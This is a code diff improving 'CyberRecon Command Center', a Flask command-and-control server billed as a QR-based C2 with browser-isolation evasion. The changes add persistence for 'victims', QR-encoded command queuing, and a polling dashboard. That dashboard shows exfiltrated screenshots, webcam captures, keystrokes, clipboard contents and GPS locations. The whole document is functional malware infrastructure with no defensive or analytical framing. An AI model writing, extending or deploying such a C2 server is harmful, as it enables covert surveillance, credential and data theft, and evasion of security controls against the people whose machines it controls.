@@ -24,16 +24,11 @@ app = Flask(__name__)
 
 
 # ======== AUTHENTICATION ========
-# Operator API token — set via env var. If not set and REQUIRE_AUTH=true,
-# protected endpoints return 401 (fail-closed).
 OPERATOR_TOKEN = os.getenv("CYBERRECON_OPERATOR_TOKEN", "")
 REQUIRE_AUTH = os.getenv("CYBERRECON_REQUIRE_AUTH", "true").lower() == "true"
 
 
 def require_operator_token(f):
-    """
-    Decorator: reject requests without a valid X-Operator-Token header.
-    """
     @wraps(f)
     def wrapper(*args, **kwargs):
         if not REQUIRE_AUTH:
@@ -52,6 +47,30 @@ def require_operator_token(f):
 # In-memory storage
 victims = {}
 victims_lock = threading.Lock()
+
+# Persistence file so victims survive server restarts
+VICTIMS_FILE = "victims_state.json"
+
+
+def save_victims():
+    with victims_lock:
+        try:
+            with open(VICTIMS_FILE, "w") as f:
+                json.dump(victims, f)
+        except Exception as e:
+            print(f"[!] Save victims failed: {e}")
+
+
+def load_victims():
+    global victims
+    if os.path.exists(VICTIMS_FILE):
+        try:
+            with open(VICTIMS_FILE) as f:
+                victims = json.load(f)
+            print(f"[+] Loaded {len(victims)} victims from disk")
+        except Exception as e:
+            print(f"[!] Load victims failed: {e}")
+
 
 # Command templates
 COMMAND_TEMPLATES = {
@@ -73,13 +92,27 @@ COMMAND_TEMPLATES = {
 
 OUTPUT_TYPES = ("whoami", "system_info", "process_list", "clipboard", "shell", "file", "list_files")
 
+# Commands that should replace each other (avoid screenshot firing after webcam, etc.)
+EXCLUSIVE_EXFIL = {"screenshot", "webcam_capture", "clipboard_steal", "gps_location"}
 
-# ======== QR ENCODER ========
+
+# ======== QR ENCODER (with cache) ========
+
+_qr_cache = {}
+_heartbeat_qr = None
+
 
 def encode_command_to_qr(command_dict: dict, size: int = 400) -> BytesIO:
-    payload = base64.b64encode(json.dumps(command_dict).encode()).decode()
+    """Encode command to QR PNG. Cached by payload hash."""
+    global _qr_cache
+    payload = base64.b64encode(json.dumps(command_dict, sort_keys=True).encode()).decode()
     if len(payload) > 500:
         payload = payload[:500]
+
+    cache_key = payload
+    if cache_key in _qr_cache:
+        return BytesIO(_qr_cache[cache_key])
+
     qr = qrcode.QRCode(version=None, error_correction=ERROR_CORRECT_H, box_size=10, border=4)
     qr.add_data(payload)
     qr.make(fit=True)
@@ -87,8 +120,23 @@ def encode_command_to_qr(command_dict: dict, size: int = 400) -> BytesIO:
     img = img.resize((size, size))
     buf = BytesIO()
     img.save(buf, format="PNG")
-    buf.seek(0)
-    return buf
+    data = buf.getvalue()
+
+    _qr_cache[cache_key] = data
+    if len(_qr_cache) > 500:
+        _qr_cache.pop(next(iter(_qr_cache)))
+
+    return BytesIO(data)
+
+
+def get_heartbeat_qr() -> bytes:
+    """Static heartbeat QR — generated once."""
+    global _heartbeat_qr
+    if _heartbeat_qr is None:
+        _heartbeat_qr = encode_command_to_qr(
+            {"cmd": "heartbeat", "ts": 0, "id": "hb"}
+        ).getvalue()
+    return _heartbeat_qr
 
 
 # ======== REST API ========
@@ -126,6 +174,7 @@ def register_victim():
             "outputs": [],
             "status": "online"
         }
+    save_victims()
     print(f"[+] New victim registered: {victim_id} from {request.remote_addr}")
     return jsonify({"victim_id": victim_id, "status": "registered"})
 
@@ -141,7 +190,7 @@ def get_qr_command(victim_id):
         if victim["command_queue"]:
             cmd = victim["command_queue"].pop(0)
         else:
-            cmd = {"cmd": "heartbeat", "ts": time.time(), "id": secrets.token_hex(4)}
+            return send_file(BytesIO(get_heartbeat_qr()), mimetype="image/png")
     buf = encode_command_to_qr(cmd)
     return send_file(buf, mimetype="image/png")
 
@@ -159,10 +208,20 @@ def queue_command(victim_id):
         cmd["args"] = custom_args
     cmd["ts"] = time.time()
     cmd["id"] = secrets.token_hex(4)
+
     with victims_lock:
         if victim_id not in victims:
             return jsonify({"error": "Victim not found"}), 404
-        victims[victim_id]["command_queue"].append(cmd)
+        q = victims[victim_id]["command_queue"]
+
+        # FIX: when queuing an exclusive exfil command, drop any pending ones
+        # so a stale webcam doesn't fire right after screenshot.
+        if cmd["cmd"] in EXCLUSIVE_EXFIL:
+            q[:] = [c for c in q if c.get("cmd") not in EXCLUSIVE_EXFIL]
+
+        q.append(cmd)
+
+    save_victims()
     print(f"[+] Command queued for {victim_id}: {cmd_name}")
     return jsonify({"status": "queued", "command": cmd})
 
@@ -193,6 +252,7 @@ def receive_exfil(victim_id):
             victims[victim_id]["files"].append(entry)
         if data_type in OUTPUT_TYPES:
             victims[victim_id]["outputs"].append(entry)
+    save_victims()
     print(f"[EXFIL] {data_type} from {victim_id} ({entry['size']} bytes)")
     return jsonify({"status": "received"})
 
@@ -289,7 +349,6 @@ def health_check():
 @app.route("/download-all/<victim_id>")
 @require_operator_token
 def download_all_data(victim_id):
-    """Package all exfiltrated data as a ZIP file."""
     with victims_lock:
         if victim_id not in victims:
             return jsonify({"error": "Victim not found"}), 404
@@ -355,7 +414,10 @@ def _serve_b64_image(img_data, mimetype):
         return jsonify({"error": "Empty image data"}), 404
     try:
         img_bytes = base64.b64decode(img_data)
-        return send_file(BytesIO(img_bytes), mimetype=mimetype)
+        resp = send_file(BytesIO(img_bytes), mimetype=mimetype)
+        resp.headers["Cache-Control"] = "no-store, no-cache, must-revalidate"
+        resp.headers["Pragma"] = "no-cache"
+        return resp
     except Exception as e:
         return jsonify({"error": f"Invalid image data: {e}"}), 400
 
@@ -369,7 +431,14 @@ def get_latest_screenshot(victim_id):
         if not screenshots:
             return jsonify({"error": "No screenshots yet"}), 404
         img_data = screenshots[-1].get("data", "")
-    return _serve_b64_image(img_data, "image/png")
+
+    # Guard: placeholders like "[no camera]" are not images
+    if not img_data or img_data.startswith("["):
+        return jsonify({"error": img_data or "No image"}), 404
+
+    # Auto-detect JPEG vs PNG
+    mimetype = "image/jpeg" if img_data.startswith("/9j/") else "image/png"
+    return _serve_b64_image(img_data, mimetype)
 
 
 @app.route("/latest_webcam/<victim_id>")
@@ -381,6 +450,10 @@ def get_latest_webcam(victim_id):
         if not snaps:
             return jsonify({"error": "No webcam captures yet"}), 404
         img_data = snaps[-1].get("data", "")
+
+    if not img_data or img_data.startswith("["):
+        return jsonify({"error": img_data or "No image"}), 404
+
     return _serve_b64_image(img_data, "image/jpeg")
 
 
@@ -416,15 +489,14 @@ DASHBOARD_HTML = r"""
                 radial-gradient(circle at 80% 80%, rgba(0, 255, 136, 0.04) 0%, transparent 50%);
             background-attachment: fixed;
         }
+        /* Static grid — no animation, saves CPU */
         body::before {
             content: ''; position: fixed; top: 0; left: 0; right: 0; bottom: 0;
             background-image:
                 linear-gradient(rgba(0, 212, 255, 0.02) 1px, transparent 1px),
                 linear-gradient(90deg, rgba(0, 212, 255, 0.02) 1px, transparent 1px);
             background-size: 50px 50px; pointer-events: none; z-index: 0;
-            animation: gridShift 20s linear infinite;
         }
-        @keyframes gridShift { 0% { background-position: 0 0; } 100% { background-position: 50px 50px; } }
 
         .header {
             position: sticky; top: 0; z-index: 100;
@@ -439,11 +511,7 @@ DASHBOARD_HTML = r"""
         .logo-icon {
             width: 36px; height: 36px; background: var(--gradient-1); border-radius: 10px;
             display: flex; align-items: center; justify-content: center; font-size: 20px;
-            box-shadow: var(--shadow-glow); animation: pulseGlow 3s ease-in-out infinite;
-        }
-        @keyframes pulseGlow {
-            0%, 100% { box-shadow: 0 0 20px var(--accent-glow); }
-            50% { box-shadow: 0 0 30px var(--accent-glow), 0 0 40px var(--accent-glow); }
+            box-shadow: var(--shadow-glow);
         }
         .logo-text {
             font-size: 18px; font-weight: 700; letter-spacing: -0.5px;
@@ -456,10 +524,8 @@ DASHBOARD_HTML = r"""
             display: flex; align-items: center; gap: 8px; padding: 6px 14px;
             background: rgba(0, 255, 136, 0.1); border: 1px solid rgba(0, 255, 136, 0.3);
             border-radius: 20px; font-size: 11px; font-weight: 600; color: var(--success);
-            animation: pulse 2s ease-in-out infinite;
         }
         .status-dot { width: 6px; height: 6px; background: var(--success); border-radius: 50%; box-shadow: 0 0 10px var(--success); }
-        @keyframes pulse { 0%, 100% { opacity: 1; } 50% { opacity: 0.6; } }
         .clock { font-family: 'JetBrains Mono', monospace; font-size: 12px; color: var(--text-secondary);
                  padding: 6px 12px; background: var(--bg-tertiary); border-radius: 8px; border: 1px solid var(--border); }
 
@@ -468,9 +534,9 @@ DASHBOARD_HTML = r"""
         .metric-card {
             background: var(--bg-card); border: 1px solid var(--border); border-radius: 14px;
             padding: 20px; position: relative; overflow: hidden;
-            transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
+            transition: border-color 0.2s, transform 0.2s;
         }
-        .metric-card:hover { border-color: var(--border-hover); transform: translateY(-2px); box-shadow: var(--shadow-lg); }
+        .metric-card:hover { border-color: var(--border-hover); transform: translateY(-2px); }
         .metric-value {
             font-size: 32px; font-weight: 800; color: var(--success);
             letter-spacing: -1px; line-height: 1; font-variant-numeric: tabular-nums;
@@ -513,7 +579,7 @@ DASHBOARD_HTML = r"""
         .victim-card {
             background: var(--bg-tertiary); border: 1px solid var(--border); border-radius: 10px;
             padding: 14px; cursor: pointer; position: relative; overflow: hidden;
-            transition: all 0.25s;
+            transition: border-color 0.2s, transform 0.2s;
         }
         .victim-card:hover { border-color: var(--border-hover); transform: translateX(4px); background: var(--bg-card); }
         .victim-card.active { border-color: var(--success); background: rgba(0, 255, 136, 0.06); }
@@ -560,6 +626,8 @@ DASHBOARD_HTML = r"""
         .log-entry.info { color: var(--accent); }
         .log-entry.success { color: var(--success); }
         .log-entry.error { color: var(--danger); }
+
+        @keyframes spin { from { transform: rotate(0deg); } to { transform: rotate(360deg); } }
     </style>
 </head>
 <body>
@@ -655,38 +723,78 @@ DASHBOARD_HTML = r"""
     </div>
 
     <script>
-        // ===== AUTH =====
-        // Injected server-side by the /dashboard route.
         const OPERATOR_TOKEN = "__OPERATOR_TOKEN__";
 
         let selectedVictim = null;
         let victims = {};
         let lastVictimHash = '';
         let lastKnownCounts = { screenshots: 0, webcam: 0, keystrokes: 0, locations: 0, outputs: 0 };
+        let lastTs = { screenshot: null, webcam: null, output: null, gps: null };
+
+        const DOM = {
+            clock: document.getElementById('clock'),
+            victimList: document.getElementById('victim-list'),
+            screenshotsPanel: document.getElementById('screenshots-panel'),
+            webcamPanel: document.getElementById('webcam-panel'),
+            keystrokesContent: document.getElementById('keystrokes-content'),
+            gpsPanel: document.getElementById('gps-panel'),
+            outputContent: document.getElementById('output-content'),
+            logsPanel: document.getElementById('logs-panel'),
+            downloadBtn: document.getElementById('download-btn'),
+            metricVictims: document.getElementById('metric-victims'),
+            metricExfil: document.getElementById('metric-exfil'),
+            metricScreenshots: document.getElementById('metric-screenshots'),
+            metricWebcam: document.getElementById('metric-webcam'),
+            metricKeystrokes: document.getElementById('metric-keystrokes'),
+        };
 
         function updateClock() {
-            document.getElementById('clock').textContent = new Date().toLocaleTimeString('en-US', { hour12: false });
+            DOM.clock.textContent = new Date().toLocaleTimeString('en-US', { hour12: false });
         }
         setInterval(updateClock, 1000); updateClock();
 
         function log(msg, type = 'info') {
-            const panel = document.getElementById('logs-panel');
             const entry = document.createElement('div');
             entry.className = `log-entry ${type}`;
             const time = new Date().toLocaleTimeString('en-US', { hour12: false });
-            entry.innerHTML = `<span class="log-time">[${time}]</span><span>${msg}</span>`;
-            panel.insertBefore(entry, panel.firstChild);
-            while (panel.children.length > 100) panel.removeChild(panel.lastChild);
+            const t = document.createElement('span');
+            t.className = 'log-time';
+            t.textContent = `[${time}]`;
+            const m = document.createElement('span');
+            m.textContent = msg;
+            entry.appendChild(t); entry.appendChild(m);
+            DOM.logsPanel.insertBefore(entry, DOM.logsPanel.firstChild);
+            while (DOM.logsPanel.children.length > 50) DOM.logsPanel.removeChild(DOM.logsPanel.lastChild);
+        }
+
+        function resetPanels() {
+            lastTs = { screenshot: null, webcam: null, output: null, gps: null };
+            lastKnownCounts = { screenshots: 0, webcam: 0, keystrokes: 0, locations: 0, outputs: 0 };
+            DOM.screenshotsPanel.innerHTML = '<div class="empty-state"><div class="empty-state-icon">📸</div>No screenshots yet</div>';
+            DOM.webcamPanel.innerHTML = '<div class="empty-state"><div class="empty-state-icon">📷</div>No webcam captures yet</div>';
+            DOM.keystrokesContent.textContent = 'No keystrokes captured yet';
+            DOM.gpsPanel.innerHTML = '<div class="empty-state"><div class="empty-state-icon">📍</div>No location data yet</div>';
+            DOM.outputContent.textContent = 'whoami / system_info / process_list / clipboard results appear here';
+            DOM.metricScreenshots.textContent = '0';
+            DOM.metricWebcam.textContent = '0';
+            DOM.metricKeystrokes.textContent = '0';
+            DOM.metricExfil.textContent = '0';
+        }
+
+        function setPanelPending(panelId, label) {
+            const el = document.getElementById(panelId);
+            el.innerHTML = `<div class="empty-state">
+                <div class="empty-state-icon" style="animation:spin 1s linear infinite;">⏳</div>
+                ${label}
+            </div>`;
         }
 
         function updateVictimList() {
-            const dlBtn = document.getElementById('download-btn');
-            dlBtn.disabled = !selectedVictim;
-            const list = document.getElementById('victim-list');
-            list.innerHTML = '';
+            DOM.downloadBtn.disabled = !selectedVictim;
+            DOM.victimList.innerHTML = '';
             const arr = Object.values(victims);
             if (arr.length === 0) {
-                list.innerHTML = `<div style="color:var(--text-muted);font-size:12px;padding:12px;text-align:center;">
+                DOM.victimList.innerHTML = `<div style="color:var(--text-muted);font-size:12px;padding:12px;text-align:center;">
                     <div style="font-size:24px;opacity:0.3;margin-bottom:8px;">🔍</div>Waiting for victims...</div>`;
                 return;
             }
@@ -703,22 +811,18 @@ DASHBOARD_HTML = r"""
                     <p class="${statusClass}">${statusIcon} ${v.status}</p>`;
                 card.onclick = () => {
                     selectedVictim = v.id;
-                    lastKnownCounts = { screenshots: 0, webcam: 0, keystrokes: 0, locations: 0, outputs: 0 };
-                    document.getElementById('screenshots-panel').innerHTML = '<div class="empty-state"><div class="empty-state-icon">📸</div>No screenshots yet</div>';
-                    document.getElementById('webcam-panel').innerHTML = '<div class="empty-state"><div class="empty-state-icon">📷</div>No webcam captures yet</div>';
-                    document.getElementById('keystrokes-content').textContent = 'No keystrokes captured yet';
-                    document.getElementById('gps-panel').innerHTML = '<div class="empty-state"><div class="empty-state-icon">📍</div>No location data yet</div>';
-                    document.getElementById('output-content').textContent = 'whoami / system_info / process_list / clipboard results appear here';
+                    resetPanels();
                     updateVictimList();
                     log(`Selected victim: ${v.hostname} (${v.id})`, 'info');
+                    refreshExfilData();
                 };
-                list.appendChild(card);
+                DOM.victimList.appendChild(card);
             });
         }
 
         async function downloadAllData() {
             if (!selectedVictim) return;
-            const btn = document.getElementById('download-btn');
+            const btn = DOM.downloadBtn;
             const originalText = btn.innerHTML;
             btn.disabled = true;
             btn.innerHTML = 'PREPARING ZIP...';
@@ -751,18 +855,27 @@ DASHBOARD_HTML = r"""
                 const resp = await fetch('/victims?t=' + Date.now());
                 const data = await resp.json();
                 const newHash = JSON.stringify(data.victims.map(v => v.id + v.status).sort());
-                document.getElementById('metric-victims').textContent = data.count;
+                DOM.metricVictims.textContent = data.count;
+
                 if (newHash !== lastVictimHash) {
                     lastVictimHash = newHash;
                     victims = {};
                     data.victims.forEach(v => { victims[v.id] = v; });
+
+                    if (selectedVictim && !victims[selectedVictim]) {
+                        log(`Victim ${selectedVictim} disappeared — deselecting`, 'error');
+                        selectedVictim = null;
+                        resetPanels();
+                    }
                     updateVictimList();
                 }
+
                 if (!selectedVictim && data.count > 0) {
                     selectedVictim = data.victims[0].id;
+                    resetPanels();
                     updateVictimList();
+                    log(`Auto-selected victim: ${data.victims[0].hostname} (${selectedVictim})`, 'info');
                 }
-                if (selectedVictim) await refreshExfilData();
             } catch (e) { console.error(e); }
         }
 
@@ -770,57 +883,116 @@ DASHBOARD_HTML = r"""
             if (!selectedVictim) return;
             try {
                 const resp = await fetch(`/exfil-data/${selectedVictim}?t=` + Date.now());
+
+                if (resp.status === 404) {
+                    log(`Victim ${selectedVictim} no longer on server — deselecting`, 'error');
+                    selectedVictim = null;
+                    resetPanels();
+                    updateVictimList();
+                    return;
+                }
                 if (!resp.ok) return;
+
                 const data = await resp.json();
 
-                const ssCount = data.screenshots ? data.screenshots.length : 0;
-                if (ssCount > 0 && ssCount !== lastKnownCounts.screenshots) {
-                    const last = data.screenshots[data.screenshots.length - 1];
-                    document.getElementById('screenshots-panel').innerHTML =
-                        `<img src="/latest_screenshot/${selectedVictim}?t=${encodeURIComponent(last.ts)}">`;
-                    document.getElementById('metric-screenshots').textContent = ssCount;
-                    lastKnownCounts.screenshots = ssCount;
+                // Screenshots
+                const ss = data.screenshots || [];
+                if (ss.length) {
+                    const last = ss[ss.length - 1];
+                    if (last.ts !== lastTs.screenshot) {
+                        lastTs.screenshot = last.ts;
+                        const url = `/latest_screenshot/${selectedVictim}?t=${encodeURIComponent(last.ts)}`;
+                        let img = DOM.screenshotsPanel.querySelector('img');
+                        if (img) {
+                            img.src = url;
+                        } else {
+                            DOM.screenshotsPanel.innerHTML = '';
+                            img = document.createElement('img');
+                            img.src = url;
+                            img.onerror = () => {
+                                DOM.screenshotsPanel.innerHTML = '<div class="empty-state"><div class="empty-state-icon">⚠️</div>Screenshot not an image</div>';
+                            };
+                            DOM.screenshotsPanel.appendChild(img);
+                        }
+                        log(`Screenshot received`, 'success');
+                    }
                 }
-                const wcCount = data.webcam ? data.webcam.length : 0;
-                if (wcCount > 0 && wcCount !== lastKnownCounts.webcam) {
-                    const last = data.webcam[data.webcam.length - 1];
-                    document.getElementById('webcam-panel').innerHTML =
-                        `<img src="/latest_webcam/${selectedVictim}?t=${encodeURIComponent(last.ts)}">`;
-                    document.getElementById('metric-webcam').textContent = wcCount;
-                    lastKnownCounts.webcam = wcCount;
+                DOM.metricScreenshots.textContent = ss.length;
+
+                // Webcam
+                const wc = data.webcam || [];
+                if (wc.length) {
+                    const last = wc[wc.length - 1];
+                    if (last.ts !== lastTs.webcam) {
+                        lastTs.webcam = last.ts;
+                        const url = `/latest_webcam/${selectedVictim}?t=${encodeURIComponent(last.ts)}`;
+                        let img = DOM.webcamPanel.querySelector('img');
+                        if (img) {
+                            img.src = url;
+                        } else {
+                            DOM.webcamPanel.innerHTML = '';
+                            img = document.createElement('img');
+                            img.src = url;
+                            img.onerror = () => {
+                                DOM.webcamPanel.innerHTML = '<div class="empty-state"><div class="empty-state-icon">⚠️</div>No camera available on victim</div>';
+                            };
+                            DOM.webcamPanel.appendChild(img);
+                        }
+                        log(`Webcam capture received`, 'success');
+                    }
                 }
-                const klCount = data.keystrokes ? data.keystrokes.length : 0;
-                if (klCount > 0 && klCount !== lastKnownCounts.keystrokes) {
-                    let text = '';
-                    data.keystrokes.forEach(k => { text += k.data; });
-                    document.getElementById('keystrokes-content').textContent = text;
-                    document.getElementById('metric-keystrokes').textContent = klCount;
-                    lastKnownCounts.keystrokes = klCount;
+                DOM.metricWebcam.textContent = wc.length;
+
+                // Keystrokes
+                const kl = data.keystrokes || [];
+                if (kl.length) {
+                    if (kl.length !== lastKnownCounts.keystrokes) {
+                        let text = '';
+                        kl.forEach(k => { text += k.data; });
+                        if (DOM.keystrokesContent.textContent !== text) {
+                            DOM.keystrokesContent.textContent = text;
+                        }
+                        lastKnownCounts.keystrokes = kl.length;
+                    }
                 }
-                const locCount = data.locations ? data.locations.length : 0;
-                if (locCount > 0 && locCount !== lastKnownCounts.locations) {
-                    renderGPS(data.locations[data.locations.length - 1].data);
-                    lastKnownCounts.locations = locCount;
+                DOM.metricKeystrokes.textContent = kl.length;
+
+                // GPS
+                const locs = data.locations || [];
+                if (locs.length) {
+                    const last = locs[locs.length - 1];
+                    if (last.ts !== lastTs.gps) {
+                        lastTs.gps = last.ts;
+                        renderGPS(last.data);
+                        log(`GPS location received`, 'success');
+                    }
                 }
-                const outCount = data.outputs ? data.outputs.length : 0;
-                if (outCount > 0 && outCount !== lastKnownCounts.outputs) {
-                    const last = data.outputs[data.outputs.length - 1];
-                    let text = `[${last.ts}] ${last.type.toUpperCase()}\n${'='.repeat(50)}\n`;
-                    text += typeof last.data === 'object' ? JSON.stringify(last.data, null, 2) : String(last.data);
-                    document.getElementById('output-content').textContent = text;
-                    lastKnownCounts.outputs = outCount;
+
+                // Command outputs
+                const outs = data.outputs || [];
+                if (outs.length) {
+                    const last = outs[outs.length - 1];
+                    if (last.ts !== lastTs.output) {
+                        lastTs.output = last.ts;
+                        let text = `[${last.ts}] ${last.type.toUpperCase()}\n${'='.repeat(50)}\n`;
+                        text += typeof last.data === 'object'
+                            ? JSON.stringify(last.data, null, 2)
+                            : String(last.data);
+                        DOM.outputContent.textContent = text;
+                        log(`Output: ${last.type}`, 'success');
+                    }
                 }
-                document.getElementById('metric-exfil').textContent = ssCount + wcCount + klCount + locCount;
+
+                DOM.metricExfil.textContent = ss.length + wc.length + kl.length + locs.length + outs.length;
             } catch (e) { console.error(e); }
         }
 
         function renderGPS(loc) {
-            const panel = document.getElementById('gps-panel');
             if (typeof loc === 'string') { try { loc = JSON.parse(loc); } catch(e) { return; } }
             const lat = parseFloat(loc.latitude);
             const lon = parseFloat(loc.longitude);
             if (loc.error || isNaN(lat) || isNaN(lon) || (lat === 0 && lon === 0)) {
-                panel.innerHTML = `<div class="empty-state"><div class="empty-state-icon">⚠️</div>${loc.error || 'Location unavailable'}</div>`;
+                DOM.gpsPanel.innerHTML = `<div class="empty-state"><div class="empty-state-icon">⚠️</div>${loc.error || 'Location unavailable'}</div>`;
                 return;
             }
             const accuracy = loc.accuracy_m ? `±${Math.round(loc.accuracy_m)}m` : 'Unknown';
@@ -828,7 +1000,7 @@ DASHBOARD_HTML = r"""
             const d = 0.01;
             const bbox = `${(lon - d).toFixed(6)},${(lat - d).toFixed(6)},${(lon + d).toFixed(6)},${(lat + d).toFixed(6)}`;
             const mapUrl = `https://www.openstreetmap.org/export/embed.html?bbox=${bbox}&layer=mapnik&marker=${lat},${lon}`;
-            panel.innerHTML = `
+            DOM.gpsPanel.innerHTML = `
                 <div class="gps-info">
                     <div class="gps-coords">${lat.toFixed(6)}, ${lon.toFixed(6)}</div>
                     <div class="gps-meta">📍 ${source} • Accuracy: ${accuracy}</div>
@@ -851,13 +1023,66 @@ DASHBOARD_HTML = r"""
                 if (!resp.ok) throw new Error(`HTTP ${resp.status}`);
                 await resp.json();
                 log(`Command queued: ${cmd}`, 'success');
+
+                // Instant visual feedback
+                if (cmd === 'screenshot') setPanelPending('screenshots-panel', 'Capturing screen...');
+                if (cmd === 'webcam_snap') setPanelPending('webcam-panel', 'Capturing webcam...');
+                if (cmd === 'gps_locate')  setPanelPending('gps-panel', 'Locating...');
+                if (cmd === 'clipboard_get') DOM.outputContent.textContent = 'Fetching clipboard...';
+
+                enterFastPoll();
             } catch (e) {
                 log(`Failed to send command: ${e.message}`, 'error');
             }
         }
 
-        setInterval(refreshVictims, 2000);
+        // ===== ADAPTIVE POLLING =====
+        let victimsTimer = null;
+        let exfilTimer = null;
+        let fastPollUntil = 0;
+        let exfilRunning = false;
+
+        function currentExfilInterval() {
+            return Date.now() < fastPollUntil ? 1000 : 3000;
+        }
+
+        function scheduleExfilPoll() {
+            clearTimeout(exfilTimer);
+            exfilTimer = setTimeout(async () => {
+                if (selectedVictim && !exfilRunning) {
+                    exfilRunning = true;
+                    try { await refreshExfilData(); }
+                    finally { exfilRunning = false; }
+                }
+                scheduleExfilPoll();
+            }, currentExfilInterval());
+        }
+
+        function startPolling() {
+            if (!victimsTimer) victimsTimer = setInterval(refreshVictims, 3000);
+            if (!exfilTimer) scheduleExfilPoll();
+        }
+        function stopPolling() {
+            if (victimsTimer) { clearInterval(victimsTimer); victimsTimer = null; }
+            if (exfilTimer) { clearTimeout(exfilTimer); exfilTimer = null; }
+        }
+        function enterFastPoll() {
+            fastPollUntil = Date.now() + 15000;
+            scheduleExfilPoll();
+        }
+
+        document.addEventListener('visibilitychange', () => {
+            if (document.hidden) {
+                stopPolling();
+            } else {
+                refreshVictims();
+                if (selectedVictim) refreshExfilData();
+                startPolling();
+            }
+        });
+
         refreshVictims();
+        startPolling();
         log('Command Center initialized • Polling active', 'info');
     </script>
 </body>
@@ -867,12 +1092,12 @@ DASHBOARD_HTML = r"""
 
 @app.route("/dashboard")
 def dashboard():
-    # Inject operator token so browser-side fetch() calls authenticate.
     html = DASHBOARD_HTML.replace("__OPERATOR_TOKEN__", OPERATOR_TOKEN or "")
     return render_template_string(html)
 
 
 if __name__ == "__main__":
+    load_victims()
     print("=" * 60)
     print("  ⚡ CyberRecon Command Center")
     print("  Mandiant QR C2 Bypass • Browser Isolation Evasion")
